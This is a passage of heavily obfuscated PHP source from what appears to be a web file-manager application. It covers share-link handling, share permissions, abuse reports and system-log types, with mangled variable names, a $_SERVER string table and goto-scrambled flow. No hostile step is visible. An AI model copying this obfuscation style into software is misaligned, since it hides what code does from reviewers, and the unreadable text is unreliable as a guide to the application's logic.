($…¹Äµ‰£[$ÁÂ“Å–’[517]] == $ÁÂ“Å–’[88] && $øâÓ÷Üö[$ÁÂ“Å–’[517]] == $ÁÂ“Å–’[198]) { $‰ë³…ô„ = $ÁÂ“Å–’[2022]; } if ($…¹Äµ‰£[$ÁÂ“Å–’[620]] == $ÁÂ“Å–’[198] && $øâÓ÷Üö[$ÁÂ“Å–’[620]] == $ÁÂ“Å–’[88]) { $‰ë³…ô„ = $ÁÂ“Å–’[2020]; } if ($…¹Äµ‰£[$ÁÂ“Å–’[620]] == $ÁÂ“Å–’[88] && $øâÓ÷Üö[$ÁÂ“Å–’[620]] == $ÁÂ“Å–’[198]) { $‰ë³…ô„ = $ÁÂ“Å–’[2023]; } Model($ÁÂ“Å–’[590])->eventShare($ıÚŠüİ¶, $‰ë³…ô„); return; } private function _addShareData($—Ìç£ˆ›, $ê¨å•Ù’ = array(), $µ—ú˜Üñ = false) { $Ùñç¤€ë =& $_SERVER[¹ş¤¶ĞÖ]; $Â«°üâÎ = $µ—ú˜Üñ == $Ùñç¤€ë[1320] ? 0 : USER_ID; $‰¶Ñ’Èí = array($Ùñç¤€ë[446] => $—Ìç£ˆ›, $Ùñç¤€ë[1667] => $Â«°üâÎ); if ($—Ìç£ˆ› == 0) { $‰¶Ñ’Èí = array($Ùñç¤€ë[2024] => $ê¨å•Ù’[$Ùñç¤€ë[1208]], $Ùñç¤€ë[1667] => $Â«°üâÎ); } if ($ÁÉ¾€æÌ = $this->where($‰¶Ñ’Èí)->find()) { return $ÁÉ¾€æÌ[$Ùñç¤€ë[622]]; } if ($—Ìç£ˆ› == 0) { $¿š‰È¥À = array($Ùñç¤€ë[32] => get_path_this($ê¨å•Ù’[$Ùñç¤€ë[84]])); } else { $¿š‰È¥À = Model($Ùñç¤€ë[851])->sourceInfo($—Ìç£ˆ›); if (!$¿š‰È¥À) { return !1; } } if (!$ê¨å•Ù’[$Ùñç¤€ë[1574]]) { $ê¨å•Ù’[$Ùñç¤€ë[1574]] = $¿š‰È¥À[$Ùñç¤€ë[32]]; } $¸À·ç¡ = array($Ùñç¤€ë[1667] => $Â«°üâÎ, $Ùñç¤€ë[446] => $—Ìç£ˆ›, $Ùñç¤€ë[1574] => $Ùñç¤€ë[12], $Ùñç¤€ë[517] => 0, $Ùñç¤€ë[620] => 0, $Ùñç¤€ë[1208] => $Ùñç¤€ë[12], $Ùñç¤€ë[336] => $Ùñç¤€ë[12], $Ùñç¤€ë[920] => $Ùñç¤€ë[12], $Ùñç¤€ë[2025] => 0, $Ùñç¤€ë[2026] => 0, $Ùñç¤€ë[787] => 0, $Ùñç¤€ë[2027] => $Ùñç¤€ë[12], $Ùñç¤€ë[2008] => $Ùñç¤€ë[12]); $å“í’¨Ò = explode($Ùñç¤€ë[50], $Ùñç¤€ë[2028]); foreach ($å“í’¨Ò as $²Õ‘“îÖ) { if (!isset($ê¨å•Ù’[$²Õ‘“îÖ])) { continue; } $¸À·ç¡[$²Õ‘“îÖ] = $ê¨å•Ù’[$²Õ‘“îÖ]; } $÷Ó¾êåØ = $this->add($¸À·ç¡); $„Ò‰„ = array($Ùñç¤€ë[2008] => short_id($÷Ó¾êåØ)); $this->where(array($Ùñç¤€ë[2029] => $÷Ó¾êåØ))->save($„Ò‰„); return $÷Ó¾êåØ; } private function _shareAuthSet($şúÂ«Î”, $ß›³ŞÖ²) { $˜œ´Ğõ¶ =& $_SERVER[¹ş¤¶ĞÖ]; if (!is_array($ß›³ŞÖ²)) { return !1; } $‡ÄÂƒ¯ï = Model($˜œ´Ğõ¶[1974]); $‡ÄÂƒ¯ï->where(array($˜œ´Ğõ¶[622] => $şúÂ«Î”))->delete(); $…â³¼ = array(); foreach ($ß›³ŞÖ² as $ú…Ùß®Ü) { $“å¯¯ìö = SourceModel::TYPE_USER; if ($ú…Ùß®Ü[$˜œ´Ğõ¶[440]] == SourceModel::TYPE_GROUP) { $“å¯¯ìö = SourceModel::TYPE_GROUP; } $ıÉîåÂÇ = array($˜œ´Ğõ¶[622] => $şúÂ«Î”, $˜œ´Ğõ¶[440] => $“å¯¯ìö, $˜œ´Ğõ¶[525] => intval($ú…Ùß®Ü[$˜œ´Ğõ¶[525]]), $˜œ´Ğõ¶[1970] => 0, $˜œ´Ğõ¶[2030] => -1); if ($ú…Ùß®Ü[$˜œ´Ğõ¶[1970]]) { $ıÉîåÂÇ[$˜œ´Ğõ¶[1970]] = $ú…Ùß®Ü[$˜œ´Ğõ¶[1970]]; } else { if ($ú…Ùß®Ü[$˜œ´Ğõ¶[2030]]) { $ıÉîåÂÇ[$˜œ´Ğõ¶[2030]] = $ú…Ùß®Ü[$˜œ´Ğõ¶[2030]]; } } $…â³¼[] = $ıÉîåÂÇ; } return $‡ÄÂƒ¯ï->addAll($…â³¼, array(), !0); } public function numViewAdd($ïâÚƒ‹©) { $Ä¸Œ†œ =& $_SERVER[¹ş¤¶ĞÖ]; $õÊ˜Ì—ß = array($Ä¸Œ†œ[2029] => $ïâÚƒ‹©); $this->where($õÊ˜Ì—ß)->setAdd($Ä¸Œ†œ[2025]); } public function numDownloadAdd($¦í”¥ÌÎ) { $€ûå³ =& $_SERVER[¹ş¤¶ĞÖ]; $ñïšµ›è = array($€ûå³[2029] => $¦í”¥ÌÎ); $this->where($ñïšµ›è)->setAdd($€ûå³[2026]); } protected function shareEdit($Š¥¿, $ëœëç“±) { $í¸úôÀ³ =& $_SERVER[¹ş¤¶ĞÖ]; $…ı†Ç» = $this->getInfo($Š¥¿); if (!$…ı†Ç») { return !1; } $this->_checkLinkShare($ëœëç“±, $…ı†Ç»); $‚ÁÕ– = array(); $´óˆÈı = explode($í¸úôÀ³[50], $í¸úôÀ³[2031]); foreach ($´óˆÈı as $šÕÜä× ) { if (!array_key_exists($šÕÜä× , $ëœëç“±)) { continue; } $‚ÁÕ–[$šÕÜä× ] = $ëœëç“±[$šÕÜä× ]; } $this->shareEventAdd($…ı†Ç»[$í¸úôÀ³[431]], $ëœëç“±, $í¸úôÀ³[1836]); $this->where(array($í¸úôÀ³[2029] => $Š¥¿))->save($‚ÁÕ–); if (isset($ëœëç“±[$í¸úôÀ³[2017]])) { $this->_shareAuthSet($Š¥¿, $ëœëç“±[$í¸úôÀ³[2017]]); } return !0; } private function _checkLinkShare($Š°ŒÕ³Ç, $·ß¡˜šô) { $şÀĞî =& $_SERVER[¹ş¤¶ĞÖ]; if ($Š°ŒÕ³Ç[$şÀĞî[517]] != $şÀĞî[88]) { return; } $©‘±ó± = $·ß¡˜šô[$şÀĞî[87]][$şÀĞî[431]]; if ($·ß¡˜šô[$şÀĞî[87]][$şÀĞî[33]] != $şÀĞî[200]) { $½ô‡µ”„ = $this->_folderReport($©‘±ó±); if (!$½ô‡µ”„) { return; } show_json(LNG($şÀĞî[2032]) . $şÀĞî[2033] . $½ô‡µ”„, !1); } $ÜŞ—¶Î® = Model($şÀĞî[851])->fileInfoGet($·ß¡˜šô[$şÀĞî[87]][$şÀĞî[431]]); if (!$ÜŞ—¶Î®) { return; } $ßÚ¤âÛç = $this->shareFileMeta($ÜŞ—¶Î®[$şÀĞî[497]]); if (isset($ßÚ¤âÛç[$şÀĞî[403]]) && $ßÚ¤âÛç[$şÀĞî[403]] == $şÀĞî[88]) { show_json(LNG($şÀĞî[2034]), !1); } } private function _folderReport($İÚÜÚ÷û) { $² °í´ =& $_SERVER[¹ş¤¶ĞÖ]; $†’·—ÌÙ = array($² °í´[497] => array($² °í´[1045], 0), $² °í´[776] => 3); $¼ì…ëÌ = Model($² °í´[2035])->where($†’·—ÌÙ)->field($² °í´[497])->select(); if (!$¼ì…ëÌ) { return !1; } $¼ì…ëÌ = array_to_keyvalue($¼ì…ëÌ, $² °í´[12], $² °í´[497]); $úİÁ´­™ = $² °í´[50] . $İÚÜÚ÷û . $² °í´[50]; $†’·—ÌÙ = array($² °í´[497] => array($² °í´[7], $¼ì…ëÌ), $² °í´[540] => array($² °í´[412], "\45{$úİÁ´­™}\x25"), $² °í´[460] => 0); $ƒ¥·¥áÃ = Model($² °í´[851])->where($†’·—ÌÙ)->field($² °í´[2036])->find(); if (!$ƒ¥·¥áÃ) { return !1; } $ëø½ùàŞ = substr($ƒ¥·¥áÃ[$² °í´[540]], strpos($ƒ¥·¥áÃ[$² °í´[540]], $úİÁ´­™)); $†’·—ÌÙ = array($² °í´[431] => array($² °í´[7], trim($ëø½ùàŞ, $² °í´[50]))); $¾ÖŞŸ¯ = Model($² °í´[851])->where($†’·—ÌÙ)->field($² °í´[32])->select(); $§¡ê­ãÅ = array_to_keyvalue($¾ÖŞŸ¯, $² °í´[12], $² °í´[32]); $§¡ê­ãÅ[] = $ƒ¥·¥áÃ[$² °í´[32]]; return implode($² °í´[8], $§¡ê­ãÅ); } protected function remove($æŞÂ™ÍÀ) { $–Œïşü½ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_array($æŞÂ™ÍÀ)) { $æŞÂ™ÍÀ = array($–Œïşü½[7], $æŞÂ™ÍÀ); } $³¬¸¤‘Å = array($–Œïşü½[622] => $æŞÂ™ÍÀ); $…Á‘ˆ¡Ÿ = $this->where($³¬¸¤‘Å)->delete(); if ($…Á‘ˆ¡Ÿ) { Model($–Œïşü½[623])->where(array($–Œïşü½[622] => $æŞÂ™ÍÀ))->delete(); } $Û·¨Îš¥ = is_array($æŞÂ™ÍÀ) ? $æŞÂ™ÍÀ[1] : array($æŞÂ™ÍÀ); for ($°¯ÏÅÀ = 0; $°¯ÏÅÀ < count($Û·¨Îš¥); $°¯ÏÅÀ++) { $¢««Œ‡ = $this->getInfo($Û·¨Îš¥[$°¯ÏÅÀ]); if ($¢««Œ‡[$–Œïşü½[620]] == $–Œïşü½[88]) { Model($–Œïşü½[590])->eventShare($¢««Œ‡[$–Œïşü½[431]], $–Œïşü½[2023]); } if ($¢««Œ‡[$–Œïşü½[517]] == $–Œïşü½[88]) { Model($–Œïşü½[590])->eventShare($¢««Œ‡[$–Œïşü½[431]], $–Œïşü½[2022]); } } return $…Á‘ˆ¡Ÿ; } protected function removeBySource($Øİ½ÓÏÛ) { $¨Š´¢ôı =& $_SERVER[¹ş¤¶ĞÖ]; $Ğ”åà¨İ = array($¨Š´¢ôı[446] => array($¨Š´¢ôı[447], $Øİ½ÓÏÛ)); $É©Û´´ = $this->field($¨Š´¢ôı[622])->where($Ğ”åà¨İ)->select(); $É©Û´´ = array_to_keyvalue($É©Û´´, $¨Š´¢ôı[12], $¨Š´¢ôı[622]); if (!$É©Û´´) { return; } $Ğ”åà¨İ = array($¨Š´¢ôı[2029] => array($¨Š´¢ôı[447], $É©Û´´)); $this->where($Ğ”åà¨İ)->delete(); Model($¨Š´¢ôı[623])->where($Ğ”åà¨İ)->delete(); } public function listAll($ĞŞ±”°é) { $Ûœ›­Ìï =& $_SERVER[¹ş¤¶ĞÖ]; $áêÈªûˆ = array(); if ($ĞŞ±”°é[$Ûœ›­Ìï[1676]]) { $áêÈªûˆ[$Ûœ›­Ìï[1676]] = $ĞŞ±”°é[$Ûœ›­Ìï[1676]]; } if ($ĞŞ±”°é[$Ûœ›­Ìï[786]]) { $±’²½äé = $ĞŞ±”°é[$Ûœ›­Ìï[787]] ? $ĞŞ±”°é[$Ûœ›­Ìï[787]] : strtotime(date($Ûœ›­Ìï[2037])); $áêÈªûˆ[$Ûœ›­Ìï[201]] = array($Ûœ›­Ìï[362], array($ĞŞ±”°é[$Ûœ›­Ìï[786]], $±’²½äé)); } if ($ĞŞ±”°é[$Ûœ›­Ìï[33]]) { $áêÈªûˆ[$ĞŞ±”°é[$Ûœ›­Ìï[33]]] = 1; } else { $áêÈªûˆ[] = array($Ûœ›­Ìï[517] => array($Ûœ›­Ìï[1045], 0), $Ûœ›­Ìï[620] => array($Ûœ›­Ìï[1045], 0), $Ûœ›­Ìï[2011] => $Ûœ›­Ìï[1964]); } if ($ĞŞ±”°é[$Ûœ›­Ìï[1960]]) { $áêÈªûˆ[] = array($Ûœ›­Ìï[2008] => $ĞŞ±”°é[$Ûœ›­Ìï[1960]], $Ûœ›­Ìï[1574] => array($Ûœ›­Ìï[412], "\x25{$ĞŞ±”°é[$Ûœ›­Ìï[1960]]}\x25"), $Ûœ›­Ìï[2011] => $Ûœ›­Ìï[1964]); } $‘øŸÇæ± = $this->_makeOrder()->where($áêÈªûˆ)->selectPage(20); if (empty($‘øŸÇæ±[$Ûœ›­Ìï[398]])) { return array(); } $this->_listDataApply($‘øŸÇæ±[$Ûœ›­Ìï[398]]); return $‘øŸÇæ±; } public function listDataApply($˜•Ç¸¦û) { $this->_listDataApply($˜•Ç¸¦û); return $˜•Ç¸¦û; } private function _listDataApply(&$ş•ı¹ÊÏ) { $ñ‹¥ÉÒ =& $_SERVER[¹ş¤¶ĞÖ]; $åÔáğ¿ = array_to_keyvalue($ş•ı¹ÊÏ, $ñ‹¥ÉÒ[12], $ñ‹¥ÉÒ[1676]); $¯úíÏ´ = Model($ñ‹¥ÉÒ[554])->userListInfo(array_unique($åÔáğ¿)); $ò‘ü¶ø = array_to_keyvalue($ş•ı¹ÊÏ, $ñ‹¥ÉÒ[12], $ñ‹¥ÉÒ[431]); $ÔğÙ¿… = Model($ñ‹¥ÉÒ[851])->sourceListInfo($ò‘ü¶ø, !0); foreach ($ş•ı¹ÊÏ as $µ¼ÌØ“¦ => &$÷«ÔÜ¼İ) { $š¼¹ÊÕœ = $÷«ÔÜ¼İ[$ñ‹¥ÉÒ[1676]]; $÷«ÔÜ¼İ[$ñ‹¥ÉÒ[2038]] = $¯úíÏ´[$š¼¹ÊÕœ] ? $¯úíÏ´[$š¼¹ÊÕœ] : !1; $’ÛŒıâå = $÷«ÔÜ¼İ[$ñ‹¥ÉÒ[431]]; $÷«ÔÜ¼İ[$ñ‹¥ÉÒ[87]] = $ÔğÙ¿…[$’ÛŒıâå] ? $ÔğÙ¿…[$’ÛŒıâå] : !1; if ($÷«ÔÜ¼İ[$ñ‹¥ÉÒ[87]][$ñ‹¥ÉÒ[460]] == $ñ‹¥ÉÒ[88]) { unset($ş•ı¹ÊÏ[$µ¼ÌØ“¦]); } if ($÷«ÔÜ¼İ[$ñ‹¥ÉÒ[87]] != $ñ‹¥ÉÒ[198] && !$÷«ÔÜ¼İ[$ñ‹¥ÉÒ[87]]) { unset($ş•ı¹ÊÏ[$µ¼ÌØ“¦]); } } unset($÷«ÔÜ¼İ); $ş•ı¹ÊÏ = array_values($ş•ı¹ÊÏ); } private function _makeOrder($º§ğàüÂ = '') { $ âºÖûº =& $_SERVER[¹ş¤¶ĞÖ]; $‰«ğª—… = array($ âºÖûº[201], $ âºÖûº[787], $ âºÖûº[2025], $ âºÖûº[2026]); $ÔìÊ½ÚÂ = array($ âºÖûº[479] => $ âºÖûº[480], $ âºÖûº[481] => $ âºÖûº[482]); $ÔĞ‰İ•Ú = Input::get($ âºÖûº[486], $ âºÖûº[7], $ âºÖûº[452], $‰«ğª—…); $®ìÌ—ºó = Input::get($ âºÖûº[487], $ âºÖûº[7], $ âºÖûº[2039], array($ âºÖûº[1957], $ âºÖûº[481])); $®ìÌ—ºó = $ÔìÊ½ÚÂ[$®ìÌ—ºó]; $º§ğàüÂ = $º§ğàüÂ . "{$ÔĞ‰İ•Ú}\x20{$®ìÌ—ºó}"; return $this->order($º§ğàüÂ); } public function reportAdd($¶öÀ™Û) { $®şõø‘ =& $_SERVER[¹ş¤¶ĞÖ]; $º§¶ş¸ù = array($®şõø‘[622] => $¶öÀ™Û[$®şõø‘[622]], $®şõø‘[1676] => USER_ID); if (Model($®şõø‘[2035])->where($º§¶ş¸ù)->find()) { return !1; } $ÖÅ‰»ÊŸ = array($®şõø‘[622] => $¶öÀ™Û[$®şõø‘[622]], $®şõø‘[1574] => $¶öÀ™Û[$®şõø‘[1574]], $®şõø‘[431] => $¶öÀ™Û[$®şõø‘[431]], $®şõø‘[497] => $¶öÀ™Û[$®şõø‘[497]], $®şõø‘[1676] => USER_ID, $®şõø‘[33] => $¶öÀ™Û[$®şõø‘[33]], $®şõø‘[482] => $¶öÀ™Û[$®şõø‘[482]]); return Model($®şõø‘[2035])->add($ÖÅ‰»ÊŸ); } public function reportList($¼ÑÖ¿îÈ) { $”ƒä‘¯ú =& $_SERVER[¹ş¤¶ĞÖ]; $™îšçØ³ = array(); if ($¼ÑÖ¿îÈ[$”ƒä‘¯ú[786]]) { $„¨„ï° = $¼ÑÖ¿îÈ[$”ƒä‘¯ú[787]] ? $¼ÑÖ¿îÈ[$”ƒä‘¯ú[787]] : strtotime(date($”ƒä‘¯ú[2037])); $™îšçØ³[$”ƒä‘¯ú[201]] = array($”ƒä‘¯ú[362], array($¼ÑÖ¿îÈ[$”ƒä‘¯ú[786]], $„¨„ï°)); } if (isset($¼ÑÖ¿îÈ[$”ƒä‘¯ú[33]]) && in_array($¼ÑÖ¿îÈ[$”ƒä‘¯ú[33]], array($”ƒä‘¯ú[88], $”ƒä‘¯ú[466], $”ƒä‘¯ú[2040], $”ƒä‘¯ú[2041], $”ƒä‘¯ú[2042]))) { $™îšçØ³[$”ƒä‘¯ú[33]] = $¼ÑÖ¿îÈ[$”ƒä‘¯ú[33]]; } if (isset($¼ÑÖ¿îÈ[$”ƒä‘¯ú[776]]) && in_array($¼ÑÖ¿îÈ[$”ƒä‘¯ú[776]], array($”ƒä‘¯ú[198], $”ƒä‘¯ú[88], $”ƒä‘¯ú[466], $”ƒä‘¯ú[2040]))) { $™îšçØ³[$”ƒä‘¯ú[776]] = $¼ÑÖ¿îÈ[$”ƒä‘¯ú[776]]; } $«­•¸¤Å = Input::get($”ƒä‘¯ú[487], $”ƒä‘¯ú[7], $”ƒä‘¯ú[2039], array($”ƒä‘¯ú[1957], $”ƒä‘¯ú[481])); $šç‹£ä× = array($”ƒä‘¯ú[479] => $”ƒä‘¯ú[480], $”ƒä‘¯ú[481] => $”ƒä‘¯ú[482]); $Óùï”¬¶ = $”ƒä‘¯ú[2043] . $šç‹£ä×[$«­•¸¤Å]; $é¬ùŒ‡‰ = Model($”ƒä‘¯ú[2035])->where($™îšçØ³)->order($Óùï”¬¶)->selectPage(20); if (empty($é¬ùŒ‡‰[$”ƒä‘¯ú[398]])) { return array(); } $€º€Ù±À = array_to_keyvalue_group($é¬ùŒ‡‰[$”ƒä‘¯ú[398]], $”ƒä‘¯ú[776], $”ƒä‘¯ú[622]); if (!empty($€º€Ù±À[0])) { $¼ÑÖ¿îÈ = $€º€Ù±À[0]; $™îšçØ³ = array($”ƒä‘¯ú[622] => array($”ƒä‘¯ú[7], $¼ÑÖ¿îÈ)); $ñîÈÄë = $this->where($™îšçØ³)->field($”ƒä‘¯ú[622])->select(); $ñîÈÄë = array_to_keyvalue($ñîÈÄë, $”ƒä‘¯ú[12], $”ƒä‘¯ú[622]); $ŞáÉ“— = array_diff($¼ÑÖ¿îÈ, $ñîÈÄë); if (!empty($ŞáÉ“—)) { foreach ($é¬ùŒ‡‰[$”ƒä‘¯ú[398]] as $—„´ñÌ€ => $ğ¼²¥•™) { if (in_array($ğ¼²¥•™[$”ƒä‘¯ú[622]], $ŞáÉ“—)) { unset($é¬ùŒ‡‰[$”ƒä‘¯ú[398]][$—„´ñÌ€]); } } } } $this->_listDataApply($é¬ùŒ‡‰[$”ƒä‘¯ú[398]]); return $é¬ùŒ‡‰; } public function reportStatus($åû¬ÑÏÙ) { $½¹Ò¤û” =& $_SERVER[¹ş¤¶ĞÖ]; $ßˆÀ© = array($½¹Ò¤û”[428] => $åû¬ÑÏÙ[$½¹Ò¤û”[428]]); $ğ¤ÙÙÉâ = Model($½¹Ò¤û”[2035])->where($ßˆÀ©)->field($½¹Ò¤û”[2044])->find(); if (!$ğ¤ÙÙÉâ) { return !1; } $¥ÄØû­Ô = array($½¹Ò¤û”[776] => $åû¬ÑÏÙ[$½¹Ò¤û”[776]]); if ($åû¬ÑÏÙ[$½¹Ò¤û”[776]] == $½¹Ò¤û”[2040] && $ğ¤ÙÙÉâ[$½¹Ò¤û”[776]] == $½¹Ò¤û”[2040]) { $¥ÄØû­Ô[$½¹Ò¤û”[776]] = 0; } $„ ÚşÃ… = Model($½¹Ò¤û”[2035])->where($ßˆÀ©)->save($¥ÄØû­Ô); if ($åû¬ÑÏÙ[$½¹Ò¤û”[776]] == $½¹Ò¤û”[466]) { if ($ğ¤ÙÙÉâ[$½¹Ò¤û”[497]] != $½¹Ò¤û”[198] && $this->shareFileMeta($ğ¤ÙÙÉâ[$½¹Ò¤û”[497]])) { $this->shareFileMeta($ğ¤ÙÙÉâ[$½¹Ò¤û”[497]], 0); } $this->remove($ğ¤ÙÙÉâ[$½¹Ò¤û”[622]]); return !0; } if ($„ ÚşÃ… && $åû¬ÑÏÙ[$½¹Ò¤û”[776]] == $½¹Ò¤û”[2040]) { $ÕÁŒõ®‘ = $¥ÄØû­Ô[$½¹Ò¤û”[776]] == $½¹Ò¤û”[2040] ? 1 : 0; $this->shareFileMeta($ğ¤ÙÙÉâ[$½¹Ò¤û”[497]], $ÕÁŒõ®‘); $this->removeByFile($ğ¤ÙÙÉâ[$½¹Ò¤û”[497]]); } return $„ ÚşÃ…; } private function removeByFile($˜¬¸ê –) { $úÅıĞå =& $_SERVER[¹ş¤¶ĞÖ]; $¹²şè´ = Model($úÅıĞå[851])->where(array($úÅıĞå[497] => $˜¬¸ê –))->field($úÅıĞå[431])->select(); $‚ÁÛƒ¾÷ = array_to_keyvalue($¹²şè´, $úÅıĞå[12], $úÅıĞå[431]); $·‹‘…ÆÉ = array($úÅıĞå[431] => array($úÅıĞå[7], $‚ÁÛƒ¾÷), $úÅıĞå[517] => 1); $¹²şè´ = $this->where($·‹‘…ÆÉ)->field($úÅıĞå[622])->select(); if (empty($¹²şè´)) { return; } $ˆÁ®§’„ = array_to_keyvalue($¹²şè´, $úÅıĞå[12], $úÅıĞå[622]); $this->remove($ˆÁ®§’„); } private function shareFileMeta($º¤ğÂÖ, $¦ËŞ–´ = null) { $ÅîÍÔİ =& $_SERVER[¹ş¤¶ĞÖ]; $ç´®ÙÁ¦ = array($ÅîÍÔİ[497] => $º¤ğÂÖ, $ÅîÍÔİ[94] => $ÅîÍÔİ[2045]); if (is_null($¦ËŞ–´)) { return Model($ÅîÍÔİ[2046])->where($ç´®ÙÁ¦)->find(); } $ç´®ÙÁ¦[$ÅîÍÔİ[403]] = $¦ËŞ–´; Model($ÅîÍÔİ[2046])->add($ç´®ÙÁ¦, array(), !0); } } $_file = $_SERVER[$_SERVER[¹ş¤¶ĞÖ][991]]; $_size = $_SERVER[¹ş¤¶ĞÖ][904]; goto C¡†Òù„Ÿ’; a„Ã‘–¯Ó«: class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x4c\151\147\x68\x74\101\x70\160"; public $modelType = "\x53\x79\x73\x74\145\x6d\x4f\x70\164\151\157\156"; public $field = array("\156\x61\155\145", "\x67\162\157\165\x70", "\144\x65\163\x63", "\143\x6f\156\164\x65\156\x74"); public function listData($êÕ¡ŒçÚ = false, $—¹Ï©®ê = "\x6d\157\x64\x69\x66\171\x54\x69\x6d\x65", $Ûø£Ø• = true) { return parent::listData($êÕ¡ŒçÚ, $—¹Ï©®ê, $Ûø£Ø•); } public function remove($ÒĞÇïîû) { $Õ“•Å¯ = $this->findByName($ÒĞÇïîû); if (!$Õ“•Å¯) { return !1; } return parent::remove($Õ“•Å¯[$_SERVER[¹ş¤¶ĞÖ][428]]); } public function add($ôãäñ‚Û) { if ($this->findByName($ôãäñ‚Û[$_SERVER[¹ş¤¶ĞÖ][32]])) { return !1; } return parent::insert($ôãäñ‚Û); } public function update($şùö», $ª©¤¡ì ) { $ İõ¾Ô€ =& $_SERVER[¹ş¤¶ĞÖ]; $°Ğ¹™Ø = $this->findByName($şùö»); $§ƒ‡âˆ = $this->findByName($ª©¤¡ì [$ İõ¾Ô€[32]]); if (!$°Ğ¹™Ø || $§ƒ‡âˆ && $§ƒ‡âˆ[$ İõ¾Ô€[428]] != $°Ğ¹™Ø[$ İõ¾Ô€[428]]) { return !1; } return parent::update($°Ğ¹™Ø[$ İõ¾Ô€[428]], $ª©¤¡ì ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\x65\155\x5f\154\157\147"; protected $dataAuto = array(array("\x63\162\x65\141\164\145\124\x69\x6d\145", "\x74\x69\155\145", "\151\x6e\x73\x65\x72\164", "\146\x75\x6e\143\x74\151\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $˜û‰½ô =& $_SERVER[¹ş¤¶ĞÖ]; return array($˜û‰½ô[2199] => LNG($˜û‰½ô[2200]), $˜û‰½ô[2201] => LNG($˜û‰½ô[2202]), $˜û‰½ô[1809] => LNG($˜û‰½ô[2203]), $˜û‰½ô[2204] => LNG($˜û‰½ô[2205]), $˜û‰½ô[2206] => LNG($˜û‰½ô[2207]), $˜û‰½ô[2208] => LNG($˜û‰½ô[2209]), $˜û‰½ô[2210] => LNG($˜û‰½ô[2211]), $˜û‰½ô[1839] => LNG($˜û‰½ô[2211]), $˜û‰½ô[1840] => LNG($˜û‰½ô[2212]), $˜û‰½ô[2213] => LNG($˜û‰½ô[2214]), $˜û‰½ô[2215] => LNG($˜û‰½ô[2216]), $˜û‰½ô[2217] => LNG($˜û‰½ô[2218]), $˜û‰½ô[2219] => LNG($˜û‰½ô[2220]), $˜û‰½ô[1837] => LNG($˜û‰½ô[2221]), $˜û‰½ô[2222] => LNG($˜û‰½ô[2223]), $˜û‰½ô[1844] => LNG($˜û‰½ô[2224]), $˜û‰½ô[2225] => LNG($˜û‰½ô[2226]), $˜û‰½ô[2227] => LNG($˜û‰½ô[2228]), $˜û‰½ô[2229] => LNG($˜û‰½ô[2230]), $˜û‰½ô[2231] => LNG($˜û‰½ô[2232]), $˜û‰½ô[1847] => LNG($˜û‰½ô[2233]), $˜û‰½ô[1848] => LNG($˜û‰½ô[2234]), $˜û‰½ô[2235] => LNG($˜û‰½ô[2236]), $˜û‰½ô[2237] => LNG($˜û‰½ô[2238]), $˜û‰½ô[2239] => LNG($˜û‰½ô[2240]), $˜û‰½ô[1842] => LNG($˜û‰½ô[2241]), $˜û‰½ô[2242] => LNG($˜û‰½ô[2243]), $˜û‰½ô[1841] => LNG($˜û‰½ô[2244]), $˜û‰½ô[2245] => LNG($˜û‰½ô[2246]), $˜û‰½ô[2247] => LNG($˜û‰½ô[2248]), $˜û‰½ô[2249] => LNG($˜û‰½ô[2250]), $˜û‰½ô[2251] => LNG($˜û‰½ô[2251]), $˜û‰½ô[2252] => LNG($˜û‰½ô[1813]), $˜û‰½ô[2253] => LNG($˜û‰½ô[2254]), $˜û‰½ô[2255] => LNG($˜û‰½ô[2256]), $˜û‰½ô[2257] => LNG($˜û‰½ô[2258]), $˜û‰½ô[2259] => LNG($˜û‰½ô[2260]), $˜û‰½ô[2261] => LNG($˜û‰½ô[2262]), $˜û‰½ô[2263] => LNG($˜û‰½ô[2263]), $˜û‰½ô[2264] => LNG($˜û‰½ô[2265]), $˜û‰½ô[2266] => LNG($˜û‰½ô[2267]), $˜û‰½ô[2268] => LNG($˜û‰½ô[2269]), $˜û‰½ô[2270] => LNG($˜û‰½ô[2271]), $˜û‰½ô[2272] => LNG($˜û‰½ô[2273]), $˜û‰½ô[2274] => LNG($˜û‰½ô[2275])); } private function typeFile() { $Õ»¼Õ±Ô =& $_SERVER[¹ş¤¶ĞÖ]; $¤ü¾ìõÄ = array($Õ»¼Õ±Ô[1844] => array($Õ»¼Õ±Ô[1845]), $Õ»¼Õ±Ô[2217] => array($Õ»¼Õ±Ô[2276]), $Õ»¼Õ±Ô[2219] => array($Õ»¼Õ±Ô[2277]), $Õ»¼Õ±Ô[1837] => array($Õ»¼Õ±Ô[1838], $Õ»¼Õ±Ô[2278]), $Õ»¼Õ±Ô[2227] => array(), $Õ»¼Õ±Ô[2229] => array(), $Õ»¼Õ±Ô[2231] => array(), $Õ»¼Õ±Ô[1847] => array($Õ»¼Õ±Ô[1849]), $Õ»¼Õ±Ô[1848] => array($Õ»¼Õ±Ô[1849]), $Õ»¼Õ±Ô[2235] => array($Õ»¼Õ±Ô[2279]), $Õ»¼Õ±Ô[2237] => array($Õ»¼Õ±Ô[2279]), $Õ»¼Õ±Ô[2239] => array($Õ»¼Õ±Ô[2280]), $Õ»¼Õ±Ô[2225] => array($Õ»¼Õ±Ô[2281]), $Õ»¼Õ±Ô[1842] => array($Õ»¼Õ±Ô[2282]), $Õ»¼Õ±Ô[2242] => array($Õ»¼Õ±Ô[2283]), $Õ»¼Õ±Ô[1841] => array($Õ»¼Õ±Ô[1843])); return $¤ü¾ìõÄ; } private function typeAll() { $“üÜ€ =& $_SERVER[¹ş¤¶ĞÖ]; $Õ¢òÊ¨ = $this->typeList; $åÆÔîú· = array_filter($this->typeFile()); foreach ($åÆÔîú· as $¼ÕË => $÷†õé§) { $Õ¢òÊ¨[$÷†õé§[0]] = $Õ¢òÊ¨[$¼ÕË]; } $Õ¢òÊ¨[$“üÜ€[1849]] = LNG($“üÜ€[2284]); $Õ¢òÊ¨[$“üÜ€[2279]] = LNG($“üÜ€[2285]); return $Õ¢òÊ¨; } public function addLog($ì¸ó•‚¥, $ÜÈ‚¸–¶ = array()) { $”Œ„¬ë =& $_SERVER[¹ş¤¶ĞÖ]; if (!isset($this->typeList[$ì¸ó•‚¥])) { return; } $—ÓœØ€ = isset($ÜÈ‚¸–¶[$”Œ„¬ë[1676]]) ? $ÜÈ‚¸–¶[$”Œ„¬ë[1676]] : 0; if (!$—ÓœØ€) { $—ÓœØ€ = Session::get($”Œ„¬ë[2003]); } if ($ì¸ó•‚¥ == 